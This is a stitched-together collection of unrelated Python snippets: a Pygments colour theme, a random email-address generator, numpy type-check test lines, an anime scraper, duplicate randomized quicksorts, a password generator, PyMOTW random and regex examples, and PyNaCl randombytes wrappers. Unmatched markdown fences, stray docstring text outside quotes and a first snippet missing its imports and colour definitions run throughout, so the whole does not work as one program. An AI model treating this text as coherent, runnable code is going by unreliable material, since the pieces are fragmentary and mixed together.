GREY_LIGHT = '#cbcbcb'
GREY_DARK = '#4d4d4d'
PURPLE = '#5918bb'
RED = '#cc0000'
RED_DARK = '#c5060b'
RED_LIGHT = '#ffcccc'
RED_BRIGHT = '#ff0000'
WHITE = '#ffffff'
TURQUOISE = '#318495'
ORANGE = '#ff8000'


class RainbowDashStyle(Style):
    """
    A bright and colorful syntax highlighting theme.
    """

    background_color = WHITE

    styles = {
        Comment: 'italic {}'.format(BLUE_LIGHT),
        Comment.Preproc: 'noitalic',
        Comment.Special: 'bold',

        Error: 'bg:{} {}'.format(RED, WHITE),

        Generic.Deleted: 'border:{} bg:{}'.format(RED_DARK, RED_LIGHT),
        Generic.Emph: 'italic',
        Generic.Error: RED_BRIGHT,
        Generic.Heading: 'bold {}'.format(BLUE),
        Generic.Inserted: 'border:{} bg:{}'.format(GREEN_NEON, GREEN_LIGHT),
        Generic.Output: GREY,
        Generic.Prompt: 'bold {}'.format(BLUE),
        Generic.Strong: 'bold',
        Generic.Subheading: 'bold {}'.format(BLUE),
        Generic.Traceback: RED_DARK,

        Keyword: 'bold {}'.format(BLUE),
        Keyword.Pseudo: 'nobold',
        Keyword.Type: PURPLE,

        Name.Attribute: 'italic {}'.format(BLUE),
        Name.Builtin: 'bold {}'.format(PURPLE),
        Name.Class: 'underline',
        Name.Constant: TURQUOISE,
        Name.Decorator: 'bold {}'.format(ORANGE),
        Name.Entity: 'bold {}'.format(PURPLE),
        Name.Exception: 'bold {}'.format(PURPLE),
        Name.Function: 'bold {}'.format(ORANGE),
        Name.Tag: 'bold {}'.format(BLUE),

        Number: 'bold {}'.format(PURPLE),

        Operator: BLUE,
        Operator.Word: 'bold',

        String: GREEN,
        String.Doc: 'italic',
        String.Escape: 'bold {}'.format(RED_DARK),
        String.Other: TURQUOISE,
        String.Symbol: 'bold {}'.format(RED_DARK),

        Text: GREY_DARK,

        Whitespace: GREY_LIGHT
    }

import random
import string
import csv
import progressbar
''' Ask user for total number of emails required'''


def getcount():
    rownums = input("How many email addresses?: ")
    try:
        rowint = int(rownums)
        return rowint
    except ValueError:
        print("Please enter an integer value")
        return getcount()


'''Below function creates a random length of email between 1-20 characters length and adds domain and extension to give the resulting email'''


def makeEmail():
    extensions = ['com', 'net', 'org', 'gov']
    domains = [
        'gmail', 'yahoo', 'comcast', 'verizon', 'charter', 'hotmail',
        'outlook', 'frontier'
    ]

    finalext = extensions[random.randint(0, len(extensions) - 1)]
    finaldom = domains[random.randint(0, len(domains) - 1)]

    accountlen = random.randint(1, 20)

    finalacc = ''.join(
        random.choice(string.ascii_lowercase + string.digits)
        for _ in range(accountlen))

    finale = finalacc + "@" + finaldom + "." + finalext
    return finale


# Take the total count of emails and pass them to getcount()
howmany = getcount()

# counter for While loop
counter = 0

# empty array to add emails
emailarray = []

print("Creating email addresses...")
print("Progress: ")

prebar = progressbar.ProgressBar(maxval=int(howmany))

for i in prebar(range(howmany)):
    while counter < howmany:
        emailarray.append(str(makeEmail()))
        counter += 1
        prebar.update(i)

print("Creation completed.")

for i in emailarray:
    print(i)

import numpy as np
from typing import Any, List

SEED_FLOAT: float = 457.3
SEED_ARR_FLOAT: np.ndarray[Any, np.dtype[np.float64]] = np.array([1.0, 2, 3, 4])
SEED_ARRLIKE_FLOAT: List[float] = [1.0, 2.0, 3.0, 4.0]
SEED_SEED_SEQ: np.random.SeedSequence = np.random.SeedSequence(0)
SEED_STR: str = "String seeding not allowed"
# default rng
np.random.default_rng(SEED_FLOAT)  # E: incompatible type
np.random.default_rng(SEED_ARR_FLOAT)  # E: incompatible type
np.random.default_rng(SEED_ARRLIKE_FLOAT)  # E: incompatible type
np.random.default_rng(SEED_STR)  # E: incompatible type

# Seed Sequence
np.random.SeedSequence(SEED_FLOAT)  # E: incompatible type
np.random.SeedSequence(SEED_ARR_FLOAT)  # E: incompatible type
np.random.SeedSequence(SEED_ARRLIKE_FLOAT)  # E: incompatible type
np.random.SeedSequence(SEED_SEED_SEQ)  # E: incompatible type
np.random.SeedSequence(SEED_STR)  # E: incompatible type

seed_seq: np.random.bit_generator.SeedSequence = np.random.SeedSequence()
seed_seq.spawn(11.5)  # E: incompatible type
seed_seq.generate_state(3.14)  # E: incompatible type
seed_seq.generate_state(3, np.uint8)  # E: incompatible type
seed_seq.generate_state(3, "uint8")  # E: incompatible type
seed_seq.generate_state(3, "u1")  # E: incompatible type
seed_seq.generate_state(3, np.uint16)  # E: incompatible type
seed_seq.generate_state(3, "uint16")  # E: incompatible type
seed_seq.generate_state(3, "u2")  # E: incompatible type
seed_seq.generate_state(3, np.int32)  # E: incompatible type
seed_seq.generate_state(3, "int32")  # E: incompatible type
seed_seq.generate_state(3, "i4")  # E: incompatible type

# Bit Generators
np.random.MT19937(SEED_FLOAT)  # E: incompatible type
np.random.MT19937(SEED_ARR_FLOAT)  # E: incompatible type
np.random.MT19937(SEED_ARRLIKE_FLOAT)  # E: incompatible type
np.random.MT19937(SEED_STR)  # E: incompatible type

np.random.PCG64(SEED_FLOAT)  # E: incompatible type
np.random.PCG64(SEED_ARR_FLOAT)  # E: incompatible type
np.random.PCG64(SEED_ARRLIKE_FLOAT)  # E: incompatible type
np.random.PCG64(SEED_STR)  # E: incompatible type

np.random.Philox(SEED_FLOAT)  # E: incompatible type
np.random.Philox(SEED_ARR_FLOAT)  # E: incompatible type
np.random.Philox(SEED_ARRLIKE_FLOAT)  # E: incompatible type
np.random.Philox(SEED_STR)  # E: incompatible type

np.random.SFC64(SEED_FLOAT)  # E: incompatible type
np.random.SFC64(SEED_ARR_FLOAT)  # E: incompatible type
np.random.SFC64(SEED_ARRLIKE_FLOAT)  # E: incompatible type
np.random.SFC64(SEED_STR)  # E: incompatible type

# Generator
np.random.Generator(None)  # E: incompatible type
np.random.Generator(12333283902830213)  # E: incompatible type
np.random.Generator("OxFEEDF00D")  # E: incompatible type
np.random.Generator([123, 234])  # E: incompatible type
np.random.Generator(np.array([123, 234], dtype="u4"))  # E: incompatible type

import random


inside = random.randint(1, 37890)  # choses a random integer between given range
print(inside)

outside = random.randrange(1, 1000)  # choses a random number number in given range
print(outside)

colors = ["green", "black", "blue", "yellow", "white"]
print(random.choice(colors))  # choses random element from list

import os

import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

headers = {"UserAgent": UserAgent().random}
URL = "https://www.mywaifulist.moe/random"


def save_image(image_url: str, image_title: str) -> None:
    """
    Saves the image of anime character
    """
    image = requests.get(image_url, headers=headers)
    with open(image_title, "wb") as file:
        file.write(image.content)


def random_anime_character() -> tuple[str, str, str]:
    """
    Returns the Title, Description, and Image Title of a random anime character .
    """
    soup = BeautifulSoup(requests.get(URL, headers=headers).text, "html.parser")
    title = soup.find("meta", attrs={"property": "og:title"}).attrs["content"]
    image_url = soup.find("meta", attrs={"property": "og:image"}).attrs["content"]
    description = soup.find("p", id="description").get_text()
    _, image_extension = os.path.splitext(os.path.basename(image_url))
    image_title = title.strip().replace(" ", "_")
    image_title = f"{image_title}{image_extension}"
    save_image(image_url, image_title)
    return (title, description, image_title)


if __name__ == "__main__":
    title, desc, image_title = random_anime_character()
    print(f"{title}\n\n{desc}\n\nImage saved : {image_title}")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRandom choice```


```py

#end_pymotw_header
import random
import itertools

outcomes = {
    'heads': 0,
    'tails': 0,
}
sides = list(outcomes.keys())

for i in range(10000):
    outcomes[random.choice(sides)] += 1

print('Heads:', outcomes['heads'])
print('Tails:', outcomes['tails'])

# Random Forest Classifier Example
from matplotlib import pyplot as plt
from sklearn.datasets import load_iris
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import plot_confusion_matrix
from sklearn.model_selection import train_test_split


def main():

    """
    Random Forest Classifier Example using sklearn function.
    Iris type dataset is used to demonstrate algorithm.
    """

    # Load Iris dataset
    iris = load_iris()

    # Split dataset into train and test data
    X = iris["data"]  # features
    Y = iris["target"]
    x_train, x_test, y_train, y_test = train_test_split(
        X, Y, test_size=0.3, random_state=1
    )

    # Random Forest Classifier
    rand_for = RandomForestClassifier(random_state=42, n_estimators=100)
    rand_for.fit(x_train, y_train)

    # Display Confusion Matrix of Classifier
    plot_confusion_matrix(
        rand_for,
        x_test,
        y_test,
        display_labels=iris["target_names"],
        cmap="Blues",
        normalize="true",
    )
    plt.title("Normalized Confusion Matrix - IRIS Dataset")
    plt.show()


if __name__ == "__main__":
    main()

# Random Forest Regressor Example
from sklearn.datasets import load_boston
from sklearn.ensemble import RandomForestRegressor
from sklearn.metrics import mean_absolute_error, mean_squared_error
from sklearn.model_selection import train_test_split


def main():

    """
    Random Forest Regressor Example using sklearn function.
    Boston house price dataset is used to demonstrate the algorithm.
    """

    # Load Boston house price dataset
    boston = load_boston()
    print(boston.keys())

    # Split dataset into train and test data
    X = boston["data"]  # features
    Y = boston["target"]
    x_train, x_test, y_train, y_test = train_test_split(
        X, Y, test_size=0.3, random_state=1
    )

    # Random Forest Regressor
    rand_for = RandomForestRegressor(random_state=42, n_estimators=300)
    rand_for.fit(x_train, y_train)

    # Predict target for test data
    predictions = rand_for.predict(x_test)
    predictions = predictions.reshape(len(predictions), 1)

    # Error printing
    print(f"Mean Absolute Error:\t {mean_absolute_error(y_test, predictions)}")
    print(f"Mean Square Error  :\t {mean_squared_error(y_test, predictions)}")


if __name__ == "__main__":
    main()

from random import randint
from tempfile import TemporaryFile

import numpy as np


def _inPlaceQuickSort(A, start, end):
    count = 0
    if start < end:
        pivot = randint(start, end)
        temp = A[end]
        A[end] = A[pivot]
        A[pivot] = temp

        p, count = _inPlacePartition(A, start, end)
        count += _inPlaceQuickSort(A, start, p - 1)
        count += _inPlaceQuickSort(A, p + 1, end)
    return count


def _inPlacePartition(A, start, end):

    count = 0
    pivot = randint(start, end)
    temp = A[end]
    A[end] = A[pivot]
    A[pivot] = temp
    newPivotIndex = start - 1
    for index in range(start, end):

        count += 1
        if A[index] < A[end]:  # check if current val is less than pivot value
            newPivotIndex = newPivotIndex + 1
            temp = A[newPivotIndex]
            A[newPivotIndex] = A[index]
            A[index] = temp

    temp = A[newPivotIndex + 1]
    A[newPivotIndex + 1] = A[end]
    A[end] = temp
    return newPivotIndex + 1, count


outfile = TemporaryFile()
p = 100  # 1000 elements are to be sorted


mu, sigma = 0, 1  # mean and standard deviation
X = np.random.normal(mu, sigma, p)
np.save(outfile, X)
print("The array is")
print(X)


outfile.seek(0)  # using the same array
M = np.load(outfile)
r = len(M) - 1
z = _inPlaceQuickSort(M, 0, r)

print(
    "No of Comparisons for 100 elements selected from a standard normal distribution"
    "is :"
)
print(z)

from __future__ import print_function
from random import randint
from tempfile import TemporaryFile
import numpy as np
import math



def _inPlaceQuickSort(A,start,end):
    count = 0
    if start<end:
        pivot=randint(start,end)
        temp=A[end]
        A[end]=A[pivot]
        A[pivot]=temp

        p,count= _inPlacePartition(A,start,end)
        count += _inPlaceQuickSort(A,start,p-1)
        count += _inPlaceQuickSort(A,p+1,end)
    return count

def _inPlacePartition(A,start,end):

    count = 0
    pivot= randint(start,end)
    temp=A[end]
    A[end]=A[pivot]
    A[pivot]=temp
    newPivotIndex=start-1
    for index in range(start,end):

        count += 1
        if A[index]<A[end]:#check if current val is less than pivot value
            newPivotIndex=newPivotIndex+1
            temp=A[newPivotIndex]
            A[newPivotIndex]=A[index]
            A[index]=temp

    temp=A[newPivotIndex+1]
    A[newPivotIndex+1]=A[end]
    A[end]=temp
    return newPivotIndex+1,count

outfile = TemporaryFile()
p = 100 # 1000 elements are to be sorted




mu, sigma = 0, 1 # mean and standard deviation
X = np.random.normal(mu, sigma, p)
np.save(outfile, X)
print('The array is')
print(X)






outfile.seek(0)  # using the same array
M = np.load(outfile)
r = (len(M)-1)
z = _inPlaceQuickSort(M,0,r)

print("No of Comparisons for 100 elements selected from a standard normal distribution is :")
print(z)

import random
def random_counts(n):
    """
    Generates n random numbers between 1-10 and counts how many of each there are.
    """
    counts = {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0}
    nums = [random.randint(1,10) for i in range(1,n)]
    for i in nums:
        counts[i] += 1
    return counts

print(random_counts(40))
import string
import secrets```


```py
    This is random password generator which creates
    random password using "secrets" module.
    Since secret module uses systems CSPRNG
    therefor each charecter of password provides 6.169 bits
    of entropy.```


```py

print("We reccomend using password that is more than 8 character long")

n = input("Enter password length (Default = 16): ") or 16
n = int(n)

# Checkes if char is special charecter.
special_chars = "!@#$%^&*()"


def isspecial(char):
    if char in special_chars:
        return True
    return False


# Generates password using secrets module.


def password_generator(n):
    if n < 6:
        return "Password you are trying to generate is to short"
    char_set = string.ascii_letters + string.digits + special_chars

    # Generates password till password satisfies all standerd conditions.
    while True:
        password = ''.join(secrets.choice(char_set) for i in range(n))
        if (any(c.islower() for c in password) and any(c.isupper()
                                                       for c in password)
                and any(c.isdigit() for c in password)
                and any(isspecial(c) for c in password)):
            return password


print(password_generator(n))
````

````py
Picks the random index as the pivot```


```py
import random


def partition(A, left_index, right_index):
    pivot = A[left_index]
    i = left_index + 1
    for j in range(left_index + 1, right_index):
        if A[j] < pivot:
            A[j], A[i] = A[i], A[j]
            i += 1
    A[left_index], A[i - 1] = A[i - 1], A[left_index]
    return i - 1


def quick_sort_random(A, left, right):
    if left < right:
        pivot = random.randint(left, right - 1)
        A[pivot], A[left] = (
            A[left],
            A[pivot],
        )  # switches the pivot with the left most bound
        pivot_index = partition(A, left, right)
        quick_sort_random(
            A, left, pivot_index
        )  # recursive quicksort to the left of the pivot point
        quick_sort_random(
            A, pivot_index + 1, right
        )  # recursive quicksort to the right of the pivot point


def main():
    user_input = input("Enter numbers separated by a comma:\n").strip()
    arr = [int(item) for item in user_input.split(",")]

    quick_sort_random(arr, 0, len(arr))

    print(arr)


if __name__ == "__main__":
    main()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyGenerating random integers.```


```py

#end_pymotw_header
import random

print('[1, 100]:', end=' ')

for i in range(3):
    print(random.randint(1, 100), end=' ')

print('\n[-5, 5]:', end=' ')
for i in range(3):
    print(random.randint(-5, 5), end=' ')
print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyGenerate random numbers```


```py

#end_pymotw_header
import random

for i in range(5):
    print('%04.3f' % random.random(), end=' ')
print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRandom class.```


```py

#end_pymotw_header
import random
import time

print('Default initializiation:\n')

r1 = random.Random()
r2 = random.Random()

for i in range(3):
    print('{:04.3f}  {:04.3f}'.format(r1.random(), r2.random()))

print('\nSame seed:\n')

seed = time.time()
r1 = random.Random(seed)
r2 = random.Random(seed)

for i in range(3):
    print('{:04.3f}  {:04.3f}'.format(r1.random(), r2.random()))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRandom values from a range```


```py

#end_pymotw_header
import random

for i in range(3):
    print(random.randrange(0, 101, 5), end=' ')
print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySampling from sequences```


```py

#end_pymotw_header
import random

with open('/usr/share/dict/words', 'rt') as f:
    words = f.readlines()
words = [w.rstrip() for w in words]

for w in random.sample(words, 5):
    print(w)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyGenerate random numbers```


```py

#end_pymotw_header
import random

random.seed(1)

for i in range(5):
    print('{:04.3f}'.format(random.random()), end=' ')
print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRandom choice```


```py

#end_pymotw_header
import random
import itertools

FACE_CARDS = ('J', 'Q', 'K', 'A')
SUITS = ('H', 'D', 'C', 'S')


def new_deck():
    return [
        # Always use 2 places for the value, so the strings
        # are a consistent width.
        '{:>2}{}'.format(*c)
        for c in itertools.product(
            itertools.chain(range(2, 11), FACE_CARDS),
            SUITS,
        )
    ]


def show_deck(deck):
    p_deck = deck[:]
    while p_deck:
        row = p_deck[:13]
        p_deck = p_deck[13:]
        for j in row:
            print(j, end=' ')
        print()


# Make a new deck, with the cards in order
deck = new_deck()
print('Initial deck:')
show_deck(deck)

# Shuffle the deck to randomize the order
random.shuffle(deck)
print('\nShuffled deck:')
show_deck(deck)

# Deal 4 hands of 5 cards each
hands = [[], [], [], []]

for i in range(5):
    for h in hands:
        h.append(deck.pop())

# Show the hands
print('\nHands:')
for n, h in enumerate(hands):
    print('{}:'.format(n + 1), end=' ')
    for c in h:
        print(c, end=' ')
    print()

# Show the remaining deck
print('\nRemaining deck:')
show_deck(deck)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySave and restore state```


```py

#end_pymotw_header
import random
import os
import pickle

if os.path.exists('state.dat'):
    # Restore the previously saved state
    print('Found state.dat, initializing random module')
    with open('state.dat', 'rb') as f:
        state = pickle.load(f)
    random.setstate(state)
else:
    # Use a well-known start state
    print('No state.dat, seeding')
    random.seed(1)

# Produce random values
for i in range(3):
    print('{:04.3f}'.format(random.random()), end=' ')
print()

# Save state for next time
with open('state.dat', 'wb') as f:
    pickle.dump(random.getstate(), f)

# Produce more random values
print('\nAfter saving state:')
for i in range(3):
    print('{:04.3f}'.format(random.random()), end=' ')
print()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRandom class.```


```py

#end_pymotw_header
import random
import time

print('Default initializiation:\n')

r1 = random.SystemRandom()
r2 = random.SystemRandom()

for i in range(3):
    print('{:04.3f}  {:04.3f}'.format(r1.random(), r2.random()))

print('\nSame seed:\n')

seed = time.time()
r1 = random.SystemRandom(seed)
r2 = random.SystemRandom(seed)

for i in range(3):
    print('{:04.3f}  {:04.3f}'.format(r1.random(), r2.random()))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyGenerate random numbers```


```py

#end_pymotw_header
import random

for i in range(5):
    print('{:04.3f}'.format(random.uniform(1, 100)), end=' ')
print()

# Copyright 2013 Donald Stufft and individual contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from __future__ import absolute_import, division, print_function

from nacl import exceptions as exc
from nacl._sodium import ffi, lib

randombytes_SEEDBYTES = lib.randombytes_seedbytes()


def randombytes(size):
    """
    Returns ``size`` number of random bytes from a cryptographically secure
    random source.

    :param size: int
    :rtype: bytes
    """
    buf = ffi.new("unsigned char[]", size)
    lib.randombytes(buf, size)
    return ffi.buffer(buf, size)[:]


def randombytes_buf_deterministic(size, seed):
    """
    Returns ``size`` number of deterministically generated pseudorandom bytes
    from a seed

    :param size: int
    :param seed: bytes
    :rtype: bytes
    """
    if len(seed) != randombytes_SEEDBYTES:
        raise exc.TypeError("Deterministic random bytes must be generated "
                            "from 32 bytes")

    buf = ffi.new("unsigned char[]", size)
    lib.randombytes_buf_deterministic(buf, size, seed)
    return ffi.buffer(buf, size)[:]
````

````py
https://en.wikipedia.org/wiki/Rayleigh_quotient```


```py
from typing import Any

import numpy as np


def is_hermitian(matrix: np.ndarray) -> bool:
    """
    Checks if a matrix is Hermitian.
    >>> import numpy as np
    >>> A = np.array([
    ... [2,    2+1j, 4],
    ... [2-1j,  3,  1j],
    ... [4,    -1j,  1]])
    >>> is_hermitian(A)
    True
    >>> A = np.array([
    ... [2,    2+1j, 4+1j],
    ... [2-1j,  3,  1j],
    ... [4,    -1j,  1]])
    >>> is_hermitian(A)
    False
    """
    return np.array_equal(matrix, matrix.conjugate().T)


def rayleigh_quotient(A: np.ndarray, v: np.ndarray) -> Any:
    """
    Returns the Rayleigh quotient of a Hermitian matrix A and
    vector v.
    >>> import numpy as np
    >>> A = np.array([
    ... [1,  2, 4],
    ... [2,  3,  -1],
    ... [4, -1,  1]
    ... ])
    >>> v = np.array([
    ... [1],
    ... [2],
    ... [3]
    ... ])
    >>> rayleigh_quotient(A, v)
    array([[3.]])
    """
    v_star = v.conjugate().T
    v_star_dot = v_star.dot(A)
    assert isinstance(v_star_dot, np.ndarray)
    return (v_star_dot.dot(v)) / (v_star.dot(v))


def tests() -> None:
    A = np.array([[2, 2 + 1j, 4], [2 - 1j, 3, 1j], [4, -1j, 1]])
    v = np.array([[1], [2], [3]])
    assert is_hermitian(A), f"{A} is not hermitian."
    print(rayleigh_quotient(A, v))

    A = np.array([[1, 2, 4], [2, 3, -1], [4, -1, 1]])
    assert is_hermitian(A), f"{A} is not hermitian."
    assert rayleigh_quotient(A, v) == float(3)


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    tests()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyAnchoring the search```


```py

#end_pymotw_header
from re_test_patterns import test_patterns

test_patterns(
    'This is some text -- with punctuation.',
    [(r'^\w+', 'word at start of string'),
     (r'\A\w+', 'word at start of string'),
     (r'\w+\S*$', 'word near end of string'),
     (r'\w+\S*\Z', 'word near end of string'),
     (r'\w*t\w*', 'word containing t'),
     (r'\bt\w+', 't at start of word'),
     (r'\w+t\b', 't at end of word'),
     (r'\Bt\B', 't, not start or end of word')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRepetition of patterns```


```py

#end_pymotw_header
from re_test_patterns import test_patterns

test_patterns(
    'abbaabbba',
    [('[ab]', 'either a or b'),
     ('a[ab]+', 'a followed by 1 or more a or b'),
     ('a[ab]+?', 'a followed by 1 or more a or b, not greedy')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRepetition of patterns```


```py

#end_pymotw_header
from re_test_patterns import test_patterns

test_patterns(
    'abbaabbba',
    [('a.', 'a followed by any one character'),
     ('b.', 'b followed by any one character'),
     ('a.*b', 'a followed by anything, ending in b'),
     ('a.*?b', 'a followed by anything, ending in b')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRepetition of patterns```


```py

#end_pymotw_header
from re_test_patterns import test_patterns

test_patterns(
    'This is some text -- with punctuation.',
    [('[^-. ]+', 'sequences without -, ., or space')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRepetition of patterns```


```py

#end_pymotw_header
from re_test_patterns import test_patterns

test_patterns(
    'This is some text -- with punctuation.',
    [('[a-z]+', 'sequences of lowercase letters'),
     ('[A-Z]+', 'sequences of uppercase letters'),
     ('[a-zA-Z]+', 'sequences of letters of either case'),
     ('[A-Z][a-z]+', 'one uppercase followed by lowercase')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyMatch email addresses```


```py

#end_pymotw_header
import re

address = re.compile('[\w\d.+-]+@([\w\d.]+\.)+(com|org|edu)')

candidates = [
    u'first.last@example.com',
    u'first.last+category@gmail.com',
    u'valid-address@mail.example.com',
    u'not-valid@example.foo',
]

for candidate in candidates:
    match = address.search(candidate)
    print('{:<30}  {}'.format(
        candidate, 'Matches' if match else 'No match')
    )

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyMatch email addresses```


```py

#end_pymotw_header
import re

address = re.compile(
    '''
    [\w\d.+-]+       # username
    @
    ([\w\d.]+\.)+    # domain name prefix
    (com|org|edu)    # TODO: support more top-level domains
    ''',
    re.VERBOSE)

candidates = [
    u'first.last@example.com',
    u'first.last+category@gmail.com',
    u'valid-address@mail.example.com',
    u'not-valid@example.foo',
]

for candidate in candidates:
    match = address.search(candidate)
    print('{:<30}  {}'.format(
        candidate, 'Matches' if match else 'No match'),
    )

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyMatch email addresses```


```py

#end_pymotw_header
import re

address = re.compile(
    '''

    # A name is made up of letters, and may include "."
    # for title abbreviations and middle initials.
    ((?P<name>
       ([\w.,]+\s+)*[\w.,]+)
       \s*
       # Email addresses are wrapped in angle
       # brackets < >, but only if a name is
       # found, so keep the start bracket in this
       # group.
       <
    )? # the entire name is optional

    # The address itself: username@domain.tld
    (?P<email>
      [\w\d.+-]+       # username
      @
      ([\w\d.]+\.)+    # domain name prefix
      (com|org|edu)    # limit the allowed top-level domains
    )

    >? # optional closing angle bracket
    ''',
    re.VERBOSE)

candidates = [
    u'first.last@example.com',
    u'first.last+category@gmail.com',
    u'valid-address@mail.example.com',
    u'not-valid@example.foo',
    u'First Last <first.last@example.com>',
    u'No Brackets first.last@example.com',
    u'First Last',
    u'First Middle Last <first.last@example.com>',
    u'First M. Last <first.last@example.com>',
    u'<first.last@example.com>',
]

for candidate in candidates:
    print('Candidate:', candidate)
    match = address.search(candidate)
    if match:
        print('  Name :', match.groupdict()['name'])
        print('  Email:', match.groupdict()['email'])
    else:
        print('  No match')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyEscape codes```


```py

#end_pymotw_header
from re_test_patterns import test_patterns

test_patterns(
    'A prime #1 example!',
    [(r'\d+', 'sequence of digits'),
     (r'\D+', 'sequence of non-digits'),
     (r'\s+', 'sequence of whitespace'),
     (r'\S+', 'sequence of non-whitespace'),
     (r'\w+', 'alphanumeric characters'),
     (r'\W+', 'non-alphanumeric')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyEscaping escape codes```


```py

#end_pymotw_header
from re_test_patterns import test_patterns

test_patterns(
    r'\d+ \D+ \s+',
    [(r'\\.\+', 'escape code')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRepetition of patterns```


```py

#end_pymotw_header
import re

text = 'abbaaabbbbaaaaa'

pattern = 'ab'

for match in re.findall(pattern, text):
    print('Found {!r}'.format(match))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRepetition of patterns```


```py

#end_pymotw_header
import re

text = 'abbaaabbbbaaaaa'

pattern = 'ab'

for match in re.finditer(pattern, text):
    s = match.start()
    e = match.end()
    print('Found {!r} at {:d}:{:d}'.format(
        text[s:e], s, e))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRevert to ASCII character definitions```


```py

#end_pymotw_header
import re

text = u'Français złoty Österreich'
pattern = r'\w+'
ascii_pattern = re.compile(pattern, re.ASCII)
unicode_pattern = re.compile(pattern)

print('Text    :', text)
print('Pattern :', pattern)
print('ASCII   :', list(ascii_pattern.findall(text)))
print('Unicode :', list(unicode_pattern.findall(text)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyMatching newlines in multiline input```


```py

#end_pymotw_header
import re

text = 'This is some text -- with punctuation.\nA second line.'
pattern = r'.+'
no_newlines = re.compile(pattern)
dotall = re.compile(pattern, re.DOTALL)

print('Text:\n  {!r}'.format(text))
print('Pattern:\n  {}'.format(pattern))
print('No newlines :')
for match in no_newlines.findall(text):
    print('  {!r}'.format(match))
print('Dotall      :')
for match in dotall.findall(text):
    print('  {!r}'.format(match))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyEmbedding flags in the expression.```


```py

#end_pymotw_header
import re

text = 'This is some text -- with punctuation.'
pattern = r'(?i)\bT\w+'
regex = re.compile(pattern)

print('Text      :', text)
print('Pattern   :', pattern)
print('Matches   :', regex.findall(text))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCase-insensitive matches```


```py

#end_pymotw_header
import re

text = 'This is some text -- with punctuation.'
pattern = r'\bT\w+'
with_case = re.compile(pattern)
without_case = re.compile(pattern, re.IGNORECASE)

print('Text:\n  {!r}'.format(text))
print('Pattern:\n  {}'.format(pattern))
print('Case-sensitive:')
for match in with_case.findall(text):
    print('  {!r}'.format(match))
print('Case-insensitive:')
for match in without_case.findall(text):
    print('  {!r}'.format(match))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyMultiline input```


```py

#end_pymotw_header
import re

text = 'This is some text -- with punctuation.\nA second line.'
pattern = r'(^\w+)|(\w+\S*$)'
single_line = re.compile(pattern)
multiline = re.compile(pattern, re.MULTILINE)

print('Text:\n  {!r}'.format(text))
print('Pattern:\n  {}'.format(pattern))
print('Single Line :')
for match in single_line.findall(text):
    print('  {!r}'.format(match))
print('Multline    :')
for match in multiline.findall(text):
    print('  {!r}'.format(match))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyMatching vs. searching```


```py

#end_pymotw_header
import re

text = 'This is some text -- with punctuation.'
pattern = 'is'

print('Text       :', text)
print('Pattern    :', pattern)

m = re.search(pattern, text)
print('Search     :', m)
s = re.fullmatch(pattern, text)
print('Full match :', s)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRegular expression grouping```


```py

#end_pymotw_header
from re_test_patterns import test_patterns

test_patterns(
    'abbaaabbbbaaaaa',
    [('a(ab)', 'a followed by literal ab'),
     ('a(a*b*)', 'a followed by 0-n a and 0-n b'),
     ('a(ab)*', 'a followed by 0-n ab'),
     ('a(ab)+', 'a followed by 1-n ab')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyMatching alternative groups```


```py

#end_pymotw_header
from re_test_patterns_groups import test_patterns

test_patterns(
    'abbaabbba',
    [(r'a((a+)|(b+))', 'a then seq. of a or seq. of b'),
     (r'a((a|b)+)', 'a then seq. of [ab]')],
)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLooking for a specific group in a match```


```py

#end_pymotw_header
import re

text = 'This is some text -- with punctuation.'

print('Input text            :', text)

# word starting with 't' then another word
regex = re.compile(r'(\bt\w+)\W+(\w+)')
print('Pattern               :', regex.pattern)

match = regex.search(text)
print('Entire match          :', match.group(0))
print('Word starting with "t":', match.group(1))
print('Word after "t" word   :', match.group(2))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
